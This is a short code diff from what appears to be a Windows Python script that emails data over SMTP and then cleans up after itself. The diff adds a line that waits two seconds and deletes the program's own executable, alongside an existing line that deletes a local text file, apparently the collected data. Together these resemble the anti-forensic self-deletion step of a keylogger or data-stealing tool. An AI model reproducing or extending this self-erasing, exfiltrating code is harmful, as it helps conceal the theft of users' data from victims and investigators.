@@ -36,5 +36,7 @@ with smtplib.SMTP(host = "mail.yourdomain.com", port = 587) as server: #If you p
 time.sleep(1)
 def delete():
 	command1 = "del clear.txt"
+	command2 = "timeout /t 2 & DEL FILENAME.EXE"
 	process = os.popen(command1)
+	process = os.popen(command2)
 delete()
